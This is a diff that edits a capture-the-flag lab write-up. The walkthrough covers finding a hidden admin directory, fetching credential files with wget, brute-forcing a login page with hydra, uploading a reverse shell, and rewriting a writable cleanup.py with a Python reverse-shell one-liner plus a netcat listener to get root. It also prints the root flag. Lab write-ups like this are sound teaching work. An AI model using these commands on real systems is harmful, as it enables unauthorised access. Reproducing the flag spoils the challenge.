@@ -26,14 +26,16 @@ Go to robots.txt
   Disallow : /admin-dir
 
   I told d4rckh we should hide our things deep.
-Go to /admin-dir
 
-  Download the files using :
-  wget http://10.10.13.146/admin-dir/credentials.txt
-  wget http://10.10.13.146/admin-dir/userid
+Entering into /admin-dir
+
+  <img src="screenshots/admindir.png">
   
-  u will get to files
-  user id and credentials.txt
+  Downloading the files using :
+  
+    wget http://10.10.13.146/admin-dir/credentials.txt
+    wget http://10.10.13.146/admin-dir/userid
+  
   
  There is a login page and we have the userid and credentials.txt file. We can try and bruteforce the login page via hydra.
 
@@ -41,7 +43,7 @@ Go to /admin-dir
    
     hydra -L userid -P credentials.txt 10.10.127.236 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect"
 
-     HYDRA IMAGE
+   <img src="screenshots/hydra.png">
 
     After logging in we get into home.php where we can upload files. Upload the script for reverse shell here.
 
@@ -65,11 +67,14 @@ Now we run the directory scan
  Now let's hunt for the root flag. Looking at the permissions of files cleanup.py we find it has write permissions too.
  Lets modify it for privileged reverse shell
      
-     printf 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.18.39",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > cleanup.py
+    printf 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Your THM IP",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > cleanup.py
 
     Also setup a listener port nc -lvnp 5555
- And finally we have our root shell
- <img src="screenshots/rootshell.png">
+ 
+ 
+ And finally we have our root shell  
+  
+  <img src="screenshots/rootshell.png">
 
     Root flag! 
     7e055812184a5fa5109d5db5c7eda7cd
